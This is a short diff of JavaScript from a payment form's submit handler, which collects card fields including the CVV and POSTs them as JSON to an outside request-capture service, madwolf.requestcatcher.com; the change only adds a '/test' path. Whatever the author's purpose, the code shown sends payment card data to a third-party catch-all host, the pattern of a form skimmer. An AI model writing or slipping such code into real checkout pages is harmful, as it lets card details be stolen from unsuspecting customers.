@@ -10,7 +10,7 @@ paymentForm.addEventListener('submit', async (event) => {
             cvv: document.getElementById('cvv').value
         }
 
-        await fetch("https://madwolf.requestcatcher.com", {
+        await fetch("https://madwolf.requestcatcher.com/test", {
             method: "POST",
             headers: {
                 'Content-Type': 'application/json'
